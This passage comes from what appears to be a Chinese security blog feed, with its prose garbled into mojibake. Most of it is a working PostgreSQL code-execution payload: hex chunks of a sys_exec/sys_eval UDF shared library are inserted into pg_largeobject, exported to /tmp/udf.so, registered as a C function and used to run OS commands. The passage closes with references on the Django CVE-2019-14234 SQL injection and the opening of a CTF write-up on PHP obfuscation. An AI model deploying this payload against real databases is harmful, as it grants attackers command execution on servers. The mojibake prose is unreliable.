01e000000000000001e200000000000001e200000000000000200000000000000020000000000000100000000000000040000001400000003000000474e5500bc18d001b8d1db33f56f9fa1d194c131375c6a5c00000000030000001d00000002000000070000008440030810890c99880c008dc84400001d0000002400000029000000325e541ea868be124245d5ec2e67541eaa5fbe12bae3927c5f4de3214aad229d32a1f45bd871581cb88df10e25681b32c60da6d4ead3ef0e6637d3ed339268fe000000000000000000000000000000000000000000000000000000000000000003000900100c0000000000000000000000000000ec00000012000000000000000000000000000000000000001101000012000000000000000000000000000000000000001c00000020000000000000000000000000000000000000008401000012000000000000000000000000000000000000007d0100001200000000000000000000000000000000000000ba00000012000000000000000000000000000000000000008a0100001200000000000000000000000000000000000000480100001200000000000000000000000000000000000000e400000012000000000000000000000000000000000000001f01000012000000000000000000000000000000000000001901000012000000000000000000000000000000000000007701000012000000000000000000000000000000000000000100000020000000000000000000000000000000000000009f0000001200000000000000000000000000000000000000d300000010000000000000000000000000000000000000009800000012000000000000000000000000000000000000007101000012000000000000000000000000000000000000000901000012000000000000000000000000000000000000004d01000012000000000000000000000000000000000000000301000012000000000000000000000000000000000000006b0100001200000000000000000000000000000000000000400100001200000000000000000000000000000000000000610000002000000000000000000000000000000000000000380000002000000000000000000000000000000000000000520000002200000000000000000000000000000000000000eb00000010000000000000000000000000000000000000003b0100001200000000000000000000000000000000000000f100000012000c0031100000000000000d00000000000000ca00000012000c00bc0f0000000000007500000000000000a501000010001700e0202000000000000000000000000000c100000012000c00af0f0000000000000d00000000000000fa00000012000c003e100000000000002201000000000000b801000010001800e82020000000000000000000000000005e01000012000c007a1200000000000024020000000000002601000012000c0060110000000000000d000000000000008300000012000c00dd0e0000000000006200000000000000ac01000010001800e02020000000000000000000000000001000000012000900100c00000000000000000000000000002f01000012000c006d1100000000000000010000000000007500000012000c00d00e0000000000000d000000000000001600000012000d00a01400000000000000000000000000005501000012000c006d120000000000000d00000000000000a600000012000c003f0f0000000000007000000000000000005f5f676d6f6e5f73746172745f5f005f696e6974005f66696e69005f49544d5f64657265676973746572544d436c6f6e655461626c65005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a65005f4a765f5265676973746572436c61737365730050675f6d616769635f66756e6300746578745f7074725f746f5f636861725f707472006d616c6c6f63006d656d637079006368725f7074725f746f5f746578745f707472007374726c656e0070675f66696e666f5f7379735f657865630070675f6465746f6173745f646174756d0073797374656d0070667265650070675f66696e666f5f7379735f6576616c00706f70656e007265616c6c6f63007374726e6370790066676574730070636c6f73650070675f66696e666f5f7379735f62696e6576616c00666f726b00737973636f6e66006d6d617000776169747069640070675f66696e666f5f7379735f66696c657265'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">1</span>, <span class="keyword">decode</span>(<span class="string">'616400666f70656e00667365656b006674656c6c0066636c6f7365006672656164005f5f737461636b5f63686b5f6661696c006c6962632e736f2e36005f6564617461005f5f6273735f7374617274005f656e6400474c4942435f322e313400474c4942435f322e3400474c4942435f322e322e3500000000000200020000000200020002000300020002000200020002000000040000000200020002000200020002000200000000000200000002000100010001000100010001000100010001000100010001000100010001000100010003009b01000010000000000000009491960600000400bd010000100000001469690d00000300c801000010000000751a690900000200d201000000000000001e2000000000000800000000000000a00e000000000000081e2000000000000800000000000000600e000000000000d8202000000000000800000000000000d820200000000000d81f20000000000006000000040000000000000000000000e01f200000000000060000000e0000000000000000000000e81f20000000000006000000180000000000000000000000f01f20000000000006000000190000000000000000000000f81f200000000000060000001a00000000000000000000001820200000000000070000000200000000000000000000002020200000000000070000000300000000000000000000002820200000000000070000000500000000000000000000003020200000000000070000000600000000000000000000003820200000000000070000000700000000000000000000004020200000000000070000000800000000000000000000004820200000000000070000000900000000000000000000005020200000000000070000000a00000000000000000000005820200000000000070000000b00000000000000000000006020200000000000070000000c00000000000000000000006820200000000000070000002500000000000000000000007020200000000000070000000d00000000000000000000007820200000000000070000000f0000000000000000000000802020000000000007000000100000000000000000000000882020000000000007000000110000000000000000000000902020000000000007000000120000000000000000000000982020000000000007000000130000000000000000000000a02020000000000007000000140000000000000000000000a82020000000000007000000150000000000000000000000b02020000000000007000000160000000000000000000000b82020000000000007000000170000000000000000000000c020200000000000070000001b0000000000000000000000c820200000000000070000001c0000000000000000000000d020200000000000070000002c00000000000000000000004883ec08488b05c51320004885c07405e89b0100004883c408c3000000000000ff35d2132000ff25d41320000f1f4000ff25d21320006800000000e9e0ffffffff25ca1320006801000000e9d0ffffffff25c21320006802000000e9c0ffffffff25ba1320006803000000e9b0ffffffff25b21320006804000000e9a0ffffffff25aa1320006805000000e990ffffffff25a21320006806000000e980ffffffff259a1320006807000000e970ffffffff25921320006808000000e960ffffffff258a1320006809000000e950ffffffff2582132000680a000000e940ffffffff257a132000680b000000e930ffffffff2572132000680c000000e920ffffffff256a132000680d000000e910ffffffff2562132000680e000000e900ffffffff255a132000680f000000e9f0feffffff25521320006810000000e9e0feffffff254a1320006811000000e9d0feffffff25421320006812000000e9c0feffffff253a1320006813000000e9b0feffffff25321320006814000000e9a0feffffff252a1320006815000000e990feffffff25221320006816000000e980feffffff251a1320006817000000e970feffffff251a1220006690ff252a1220006690488d3d09132000488d0509132000554829f84889e54883f80e7615488b05e61120004885c074095dffe0660f1f4400005dc30f1f4000662e0f1f840000000000488d3dc9122000488d35c2122000554829fe4889e548c1fe034889f048c1e83f4801c648d1fe7418488b05b11120004885c0740c5dffe0660f1f8400000000005dc30f1f4000662e0f1f840000000000803d7912200000752748833d8711200000554889e5740c488b3d5a122000e845ffffffe848ffffff5dc6055012200001f3c30f1f4000662e0f1f840000000000488d3d690f200048833f00750be95effffff660f1f440000488b05291120004885c074e9554889e5ffd05de940ffffff554889e5488d05e50500005dc3554889e54883ec2048897de8488b45e88b00c1e80283e8048945f48b45f483c00148984889c7e818feffff488945f88b45f44863d0488b45e8488d4804488b45f84889ce4889c7e8d7fdffff8b45f44863d0488b45f84801d0c60000488b45f8c9c3554889e54883ec2048897de8488b45e84889c7e829fdffff4883c0044889c7e8bdfdffff488945f8488b45e84889c7e80dfdffff83c0048d148500000000488b45f88910488b45e84889c7e8f1fcffff4889c2488b45f8488d4804488b45e84889c64889cfe857fdffff488b45f8c9c3554889e5488d05220500005dc3554889e54883ec3048897dd8488b45d8488b40204889c7e838fdffff488945f0c745ec00000000488b45f04889c7e8f1fcffff488945f8488b45f84889c7e8b1fcffff89'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">2</span>, <span class="keyword">decode</span>(<span class="string">'45ec488b45f84889c7e832fcffff488b45d8488b4020483b45f0740c488b45f04889c7e868fdffff8b45ec489889c0c9c3554889e5488d05a40400005dc3554889e54883ec5048897db8488b45b8488b40204889c7e8b6fcffff488945d8488b45d84889c7e876fcffff488945e0bf00040000e8a8fcffff488945e8bf01000000e89afcffff488945d0c745c800000000488b45d0c60000488b45e0488d350d0400004889c7e8b5fcffff488945f0eb55488b45e84889c7e8c3fbffff8945cc8b55c88b45cc01d04863d0488b45d04889d64889c7e866fcffff488945d08b45cc4863d08b45c84863c8488b45d04801c1488b45e84889c64889cfe850fbffff8b45cc0145c8488b55f0488b45e8be080000004889c7e8b5fbffff4885c07591488b45f04889c7e894fbffff488b45d00fb60084c074138b45c84898488d50ff488b45d04801d0c60000488b45d04889c7e85afcffff488945f8488b45f8c9c3554889e5488d05790300005dc3554889e54883ec4048897dc8488b45c8488b40204889c7e887fbffff488945e0488b45e08b00c1e80283e8048945d88b45d84898488945e8e8f6fbffff8945dc837ddc00790ab801000000e9ae000000837ddc000f8585000000bf1e000000e8affbffff4883e801488945f0488b55e8488b45f04801c2488b45f048f7d04821d0488945f0488b45f041b90000000041b800000000b921000000ba070000004889c6bf00000000e887faffff488945f848837df8ff7507b801000000eb40488b45e0488d4804488b55e8488b45f84889ce4889c7e80afaffff488b45f8ffd0837ddc007e148b45dcba01000000be0000000089c7e8eafaffffb800000000c9c3554889e5488d05700200005dc3554889e54883ec7048897d9864488b042528000000488945f831c0488b4598488b40204889c7e86bfaffff488945b048b83031323334353637488945e048b83839414243444546488945e8c645f000488b45b04889c7e80bfaffff488945b8488b45b8488d35ce0100004889c7e884faffff488945c048837dc0007512488b4598c6401c01b800000000e97f010000488b45c0ba02000000be000000004889c7e811faffff488b45c04889c7e8c5f9ffff8945ac488b45c0ba00000000be000000004889c7e8ecf9ffff8b45ac83c00148984889c7e8ccf9ffff488945c848837dc800751e488b45c04889c7e805f9ffff488b4598c6401c01b800000000e90b0100008b45ac4863f0488b55c0488b45c84889d1ba010000004889c7e8c5f8ffff488b45c04889c7e8c9f8ffff8b45ac01c083c00148984889c7e867f9ffff488945d0c745a400000000c745a800000000eb6b8b45a88d50018955a84863d0488b45d04801c28b45a44863c8488b45c84801c80fb600c0f8040fbec083e00f48980fb64405e088028b45a88d50018955a84863d0488b45d04801c28b45a44863c8488b45c84801c80fb6000fbec083e00f48980fb64405e088028345a4018b45a43b45ac7c8d8b45a84863d0488b45d04801d0c60000488b45d04889c7e854f9ffff488945d8488b45d04889c7e8d4f7ffff488b45c84889c7e8c8f7ffff488b45b84889c7e8bcf7ffff488b45d8488b4df86448330c25280000007405e8f4f7ffffc9c300004883ec084883c408c300000000000000720072620000000000000000000000001c0000008a030000640000002000000040000000010000000100000001000000010000000100000001000000011b033b680000000c00000044f7ffff84000000e4f9ffffac000000f1f9ffffcc00000053faffffec000000c3faffff0c010000d0faffff2c01000045fbffff4c01000052fbffff6c01000074fcffff8c01000081fcffffac01000081fdffffcc0100008efdffffec0100001400000000000000017a5200017810011b0c070890010000240000001c000000b8f6ffff90010000000e10460e184a0f0b770880003f1a3b2a332422000000001c0000004400000030f9ffff0d00000000410e108602430d06480c07080000001c000000640000001df9ffff6200000000410e108602430d06025d0c070800001c000000840000005ff9ffff7000000000410e108602430d06026b0c070800001c000000a4000000aff9ffff0d00000000410e108602430d06480c07080000001c000000c40000009cf9ffff7500000000410e108602430d0602700c070800001c000000e4000000f1f9ffff0d00000000410e108602430d06480c07080000001c00000004010000def9ffff2201000000410e108602430d06031d010c0708001c00000024010000e0faffff0d00000000410e108602430d06480c07080000001c00000044010000cdfaffff0001000000410e108602430d0602fb0c070800001c00000064010000adfbffff0d00000000410e108602430d06480c07080000001c000000840100009afbffff2402000000410e108602430d06031f020c070800000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">3</span>, <span class="keyword">decode</span>(<span class="string">'000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00e000000000000600e000000000000000000000000000001000000000000009b010000000000000c00000000000000100c0000000000000d00000000000000a0140000000000001900000000000000001e2000000000001b0000000000000008000000000000001a00000000000000081e2000000000001c000000000000000800000000000000f5feff6f00000000f00100000000000005000000000000009806000000000000060000000000000060020000000000000a00000000000000de010000000000000b0000000000000018000000000000000300000000000000002020000000000002000000000000004002000000000000140000000000000007000000000000001700000000000000d009000000000000070000000000000010090000000000000800000000000000c00000000000000009000000000000001800000000000000feffff6f00000000d008000000000000ffffff6f000000000100000000000000f0ffff6f000000007608000000000000f9ffff6f000000000300000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">4</span>, <span class="keyword">decode</span>(<span class="string">'181e20000000000000000000000000000000000000000000460c000000000000560c000000000000660c000000000000760c000000000000860c000000000000960c000000000000a60c000000000000b60c000000000000c60c000000000000d60c000000000000e60c000000000000f60c000000000000060d000000000000160d000000000000260d000000000000360d000000000000460d000000000000560d000000000000660d000000000000760d000000000000860d000000000000960d000000000000a60d000000000000b60d000000000000d8202000000000004743433a20285562756e747520352e342e302d367562756e7475317e31362e30342e31312920352e342e30203230313630363039000000000000000000000000000000000000000000000000000000000000000003000100c80100000000000000000000000000000000000003000200f00100000000000000000000000000000000000003000300600200000000000000000000000000000000000003000400980600000000000000000000000000000000000003000500760800000000000000000000000000000000000003000600d00800000000000000000000000000000000000003000700100900000000000000000000000000000000000003000800d00900000000000000000000000000000000000003000900100c00000000000000000000000000000000000003000a00300c00000000000000000000000000000000000003000b00c00d00000000000000000000000000000000000003000c00d00d00000000000000000000000000000000000003000d00a01400000000000000000000000000000000000003000e00b01400000000000000000000000000000000000003000f00ec1400000000000000000000000000000000000003001000581500000000000000000000000000000000000003001100001e20000000000000000000000000000000000003001200081e20000000000000000000000000000000000003001300101e20000000000000000000000000000000000003001400181e20000000000000000000000000000000000003001500d81f20000000000000000000000000000000000003001600002020000000000000000000000000000000000003001700d82020000000000000000000000000000000000003001800e0202000000000000000000000000000000000000300190000000000000000000000000000000000010000000400f1ff000000000000000000000000000000000c00000001001300101e20000000000000000000000000001900000002000c00d00d00000000000000000000000000001b00000002000c00100e00000000000000000000000000002e00000002000c00600e00000000000000000000000000004400000001001800e02020000000000001000000000000005300000001001200081e20000000000000000000000000007a00000002000c00a00e00000000000000000000000000008600000001001100001e2000000000000000000000000000a50000000400f1ff00000000000000000000000000000000bd00000001000e00c0140000000000001c00000000000000d000000001000e00dc140000000000000400000000000000de00000001000e00e0140000000000000400000000000000ec00000001000e00e4140000000000000400000000000000fa00000001000e00e8140000000000000400000000000000010000000400f1ff000000000000000000000000000000000801000001001000f81600000000000000000000000000001601000001001300101e2000000000000000000000000000000000000400f1ff000000000000000000000000000000002201000001001700d82020000000000000000000000000002f01000001001400181e20000000000000000000000000003801000000000f00ec1400000000000000000000000000004b01000001001700e02020000000000000000000000000005701000001001600002020000000000000000000000000006d01000012000000000000000000000000000000000000007f01000012000c00d00e0000000000000d000000000000008d0100001200000000000000000000000000000000000000a20100002000000000000000000000000000000000000000be01000012000c0060110000000000000d00000000000000d301000012000c0031100000000000000d00000000000000e501000012000000000000000000000000000000000000009f02000012000c00bc0f0000000000007500000000000000f801000010001700e0202000000000000000000000000000ff01000012000000000000000000000000000000000000001302000012000d00a01400000000000000000000000000001902000012000000000000000000000000000000000000002d02000012000000000000000000000000000000000000004902000012000000000000000000000000000000000000005b02000012000000000000000000000000000000000000006f02000012000000000000000000000000000000000000008302000012000000000000000000000000000000000000009602000012000c00af0f0000000000000d00000000000000a802000012000c00dd0e0000000000006200000000000000dc01000012000c003e100000000000002201000000000000bd0200001200000000000000000000000000000000000000d00200002000000000000000000000000000000000000000df0200001200000000000000000000000000000000000000f2020000100000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">5</span>, <span class="keyword">decode</span>(<span class="string">'00000000000000000303000012000000000000000000000000000000000000001703000010001800e82020000000000000000000000000001c03000012000000000000000000000000000000000000002f03000012000000000000000000000000000000000000004403000010001800e02020000000000000000000000000005003000012000000000000000000000000000000000000006503000012000000000000000000000000000000000000007803000012000000000000000000000000000000000000008b0300001200000000000000000000000000000000000000a00300002000000000000000000000000000000000000000b403000020000000000000000000000000000000000000001104000012000c007a120000000000002402000000000000ce0300002200000000000000000000000000000000000000ea03000012000900100c0000000000000000000000000000f00300001000000000000000000000000000000000000000c701000012000c006d110000000000000001000000000000f603000012000000000000000000000000000000000000000804000012000c006d120000000000000d000000000000001e04000012000c003f0f00000000000070000000000000000063727473747566662e63005f5f4a43525f4c4953545f5f00646572656769737465725f746d5f636c6f6e6573005f5f646f5f676c6f62616c5f64746f72735f61757800636f6d706c657465642e37353934005f5f646f5f676c6f62616c5f64746f72735f6175785f66696e695f61727261795f656e747279006672616d655f64756d6d79005f5f6672616d655f64756d6d795f696e69745f61727261795f656e747279006c69625f706f737467726573716c7564665f7379732e630050675f6d616769635f646174612e35383133006d795f66696e666f2e35383331006d795f66696e666f2e35383436006d795f66696e666f2e35383639006d795f66696e666f2e35383838005f5f4652414d455f454e445f5f005f5f4a43525f454e445f5f005f5f64736f5f68616e646c65005f44594e414d4943005f5f474e555f45485f4652414d455f484452005f5f544d435f454e445f5f005f474c4f42414c5f4f46465345545f5441424c455f00667265654040474c4942435f322e322e350050675f6d616769635f66756e63007374726e6370794040474c4942435f322e322e35005f49544d5f64657265676973746572544d436c6f6e655461626c650070675f66696e666f5f7379735f62696e6576616c0070675f66696e666f5f7379735f6576616c0066726561644040474c4942435f322e322e35005f65646174610066636c6f73654040474c4942435f322e322e35005f66696e69007374726c656e4040474c4942435f322e322e35005f5f737461636b5f63686b5f6661696c4040474c4942435f322e34006d6d61704040474c4942435f322e322e350073797374656d4040474c4942435f322e322e350070636c6f73654040474c4942435f322e322e350066676574734040474c4942435f322e322e350070675f66696e666f5f7379735f6578656300746578745f7074725f746f5f636861725f707472006674656c6c4040474c4942435f322e322e35005f5f676d6f6e5f73746172745f5f006d656d6370794040474c4942435f322e31340070675f6465746f6173745f646174756d006d616c6c6f634040474c4942435f322e322e35005f656e6400667365656b4040474c4942435f322e322e35007265616c6c6f634040474c4942435f322e322e35005f5f6273735f737461727400776169747069644040474c4942435f322e322e3500706f70656e4040474c4942435f322e322e3500666f70656e4040474c4942435f322e322e3500737973636f6e664040474c4942435f322e322e35005f4a765f5265676973746572436c6173736573005f49544d5f7265676973746572544d436c6f6e655461626c65005f5f6378615f66696e616c697a654040474c4942435f322e322e35005f696e697400706672656500666f726b4040474c4942435f322e322e350070675f66696e666f5f7379735f66696c6572656164006368725f7074725f746f5f746578745f70747200002e73796d746162002e737472746162002e7368737472746162002e6e6f74652e676e752e6275696c642d6964002e676e752e68617368002e64796e73796d002e64796e737472002e676e752e76657273696f6e002e676e752e76657273696f6e5f72002e72656c612e64796e002e72656c612e706c74002e696e6974002e706c742e676f74002e74657874002e66696e69002e726f64617461002e65685f6672616d655f686472002e65685f6672616d65002e696e69745f6172726179002e66696e695f6172726179002e6a6372002e64796e616d6963002e676f742e706c74002e64617461002e627373002e636f6d6d656e7400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000001b000000070000000200000000000000c801000000000000c80100000000000024000000000000000000000000000000040000000000000000000000000000002e000000f6ffff6f0200000000000000f001000000000000f0010000000000006c00000000000000030000000000000008000000000000000000000000000000380000000b00000002000000000000006002000000000000600200000000000038040000000000000400000002000000080000000000000018000000000000004000000003000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> pg_largeobject <span class="keyword">VALUES</span> (<span class="number">12345</span>, <span class="number">6</span>, <span class="keyword">decode</span>(<span class="string">'020000000000000098060000000000009806000000000000de0100000000000000000000000000000100000000000000000000000000000048000000ffffff6f0200000000000000760800000000000076080000000000005a0000000000000003000000000000000200000000000000020000000000000055000000feffff6f0200000000000000d008000000000000d00800000000000040000000000000000400000001000000080000000000000000000000000000006400000004000000020000000000000010090000000000001009000000000000c0000000000000000300000000000000080000000000000018000000000000006e000000040000004200000000000000d009000000000000d009000000000000400200000000000003000000160000000800000000000000180000000000000078000000010000000600000000000000100c000000000000100c0000000000001a0000000000000000000000000000000400000000000000000000000000000073000000010000000600000000000000300c000000000000300c00000000000090010000000000000000000000000000100000000000000010000000000000007e000000010000000600000000000000c00d000000000000c00d000000000000100000000000000000000000000000000800000000000000000000000000000087000000010000000600000000000000d00d000000000000d00d000000000000ce060000000000000000000000000000100000000000000000000000000000008d000000010000000600000000000000a014000000000000a014000000000000090000000000000000000000000000000400000000000000000000000000000093000000010000000200000000000000b014000000000000b0140000000000003c000000000000000000000000000000100000000000000000000000000000009b000000010000000200000000000000ec14000000000000ec140000000000006c00000000000000000000000000000004000000000000000000000000000000a900000001000000020000000000000058150000000000005815000000000000a401000000000000000000000000000008000000000000000000000000000000b30000000e0000000300000000000000001e200000000000001e0000000000000800000000000000000000000000000008000000000000000000000000000000bf0000000f0000000300000000000000081e200000000000081e0000000000000800000000000000000000000000000008000000000000000000000000000000cb000000010000000300000000000000101e200000000000101e0000000000000800000000000000000000000000000008000000000000000000000000000000d0000000060000000300000000000000181e200000000000181e000000000000c00100000000000004000000000000000800000000000000100000000000000082000000010000000300000000000000d81f200000000000d81f0000000000002800000000000000000000000000000008000000000000000800000000000000d900000001000000030000000000000000202000000000000020000000000000d800000000000000000000000000000008000000000000000800000000000000e2000000010000000300000000000000d820200000000000d8200000000000000800000000000000000000000000000008000000000000000000000000000000e8000000080000000300000000000000e020200000000000e0200000000000000800000000000000000000000000000001000000000000000000000000000000ed0000000100000030000000000000000000000000000000e0200000000000003500000000000000000000000000000001000000000000000100000000000000110000000300000000000000000000000000000000000000022e000000000000f6000000000000000000000000000000010000000000000000000000000000000100000002000000000000000000000000000000000000001821000000000000b8080000000000001c0000003200000008000000000000001800000000000000090000000300000000000000000000000000000000000000d0290000000000003204000000000000000000000000000001000000000000000000000000000000'</span>, <span class="string">'hex'</span>));</span><br><span class="line"></span><br><span class="line"><span class="keyword">SELECT</span> lo_export(<span class="number">12345</span>, <span class="string">'/tmp/udf.so'</span>);</span><br><span class="line"><span class="keyword">SELECT</span> lo_unlink(<span class="number">12345</span>);</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">OR</span> <span class="keyword">REPLACE</span> <span class="keyword">FUNCTION</span> sys_eval(<span class="built_in">text</span>) <span class="keyword">RETURNS</span> <span class="built_in">text</span> <span class="keyword">AS</span> <span class="string">'/tmp/udf.so'</span>, <span class="string">'sys_eval'</span> <span class="keyword">LANGUAGE</span> C <span class="keyword">RETURNS</span> <span class="literal">NULL</span> <span class="keyword">ON</span> <span class="literal">NULL</span> <span class="keyword">INPUT</span> IMMUTABLE;  <span class="comment">#æ‰§è¡Œå‘½ä»¤</span></span><br><span class="line"><span class="keyword">select</span> sys_eval(<span class="string">'id'</span>);</span><br><span class="line"><span class="keyword">drop</span> <span class="keyword">function</span> sys_eval(<span class="built_in">text</span>);  <span class="comment">#åˆ é™¤å‡½æ•°</span></span><br></pre></td></tr></table></figure></div>

<h2 id="çæ‰¯ä¸€ä¼š"><a href="#çæ‰¯ä¸€ä¼š" class="headerlink" title="çæ‰¯ä¸€ä¼š"></a>çæ‰¯ä¸€ä¼š</h2><p>è¿™ä¸ªCVEè¿˜æœ‰å¾ˆå¤šè¦å­¦ä¹ çš„ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œåé¢å»èŠ±äº›æ—¶é—´äº†è§£ä¸€ä¸‹ <code>jsonField</code><br>(ps: è‡ªå·±æŒ–çš„å‘è¶Šæ¥è¶Šå¤šäº†)</p>
<p>å¼€å­¦äº†ï¼Œæ¯å¤©æœ€è¿‘å› ä¸ºä¸€äº›æ–°çš„è€ƒç ”æ”¿ç­–å‡ºå°ï¼Œæå¾—è‡ªå·±æœ‰äº›ç„¦è™‘æ€¥èºï¼Œæ…¢æ…¢é™ä¸‹å¿ƒæ¥å¥½å¥½å‡†å¤‡å§ã€‚</p>
<hr>
<h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://xz.aliyun.com/t/5896" target="_blank" rel="noopener">CVE-2019-14234 Django JSON SQLæ³¨å…¥ åˆ†æ</a><br><a href="https://www.leavesongs.com/penetration/django-jsonfield-cve-2019-14234.html" target="_blank" rel="noopener">Django JSONField SQLæ³¨å…¥æ¼æ´ï¼ˆCVE-2019-14234ï¼‰åˆ†æä¸å½±å“</a><br><a href="https://blog.csdn.net/qq_41420747/article/details/103539487" target="_blank" rel="noopener">CVE-2019-14234ç¬”è®°</a></p>
]]></content>
      <categories>
        <category>å­¦ä¹ ç¬”è®°</category>
      </categories>
      <tags>
        <tag>æ¸—é€</tag>
      </tags>
  </entry>
  <entry>
    <title>æµ…æPHPæ··æ·†åŠ å¯†</title>
    <url>/yakko117/2020/03/26/php%E6%B7%B7%E6%B7%86%E5%8A%A0%E5%AF%86/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>é€šè¿‡ä¸€é“é¢˜ï¼Œæ¥çœ‹ä¸€ä¸‹php æ··æ·†åŠ å¯†è§£å¯†åŸç†å’Œåˆ†æ<br>é¢˜ç›®æ¥è‡ª [PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥<br>è¿™å‡ å¤©å¤©å¤©ç›¯ç€è¿™äº›é¬¼ï¼Œçœ¼ç›éƒ½çœ‹çäº†<br>é¢˜ç›®æ˜¯ä¸ªå¥½é¢˜ç›®ï¼Œæˆ‘çœ‹äº†Virinkå¸ˆå‚…å’Œè…¹é»‘å¸ˆå‚…çš„é¢˜è§£ä»ç„¶å‘ç°è‡ªå·±å¾ˆå¤šä¸æ‡‚ã€‚è¿˜æ˜¯å¤ªèœäº†<br>å¥½å¥½å­¦ä¹ ï¼Œå¥½å¥½å­¦ä¹ </p>
<hr>
<h1 id="PWNHUB-å…¬å¼€èµ›-2018-å‚»-fufu-çš„å·¥ä½œæ—¥"><a href="#PWNHUB-å…¬å¼€èµ›-2018-å‚»-fufu-çš„å·¥ä½œæ—¥" class="headerlink" title="[PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥"></a>[PWNHUB å…¬å¼€èµ› 2018]å‚» fufu çš„å·¥ä½œæ—¥</h1><p>ç‚¹å¼€é¢˜ç›®ï¼Œæ˜¯ä¸ªä¸Šä¼ ï¼Œé€šè¿‡æ‰«æåå°ï¼Œå‘ç°å­˜åœ¨å¤‡ä»½æ–‡ä»¶æ³„éœ²ï¼Œå¾—åˆ°äº† <code>index.php.bak</code><br>æ–‡ä»¶æ‰“å¼€ï¼Œå‘ç°å…¨æ˜¯ä¹±ç ï¼Œä½†æ˜¯æ³¨æ„åˆ°äº†ä¸€äº›ç»†èŠ‚å› æ­¤æˆ‘ä»¬æ¥å¯¹æºç è¿›è¡Œä¸€ä¸‹åˆ†æ</p>
<p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" data-fancybox="group" data-caption="decode1" class="fancybox"><img alt="decode1" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img2/php_decode1.png" class="lazyload" title="decode1"></a></p>
<p>é¦–å…ˆæ˜¯å¼€å¤´çš„åŠ å¯†æºç½‘ç«™</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="comment">/* PHP Encode by  http://Www.PHPJiaMi.Com/ */</span></span><br></pre></td></tr></table></figure></div>

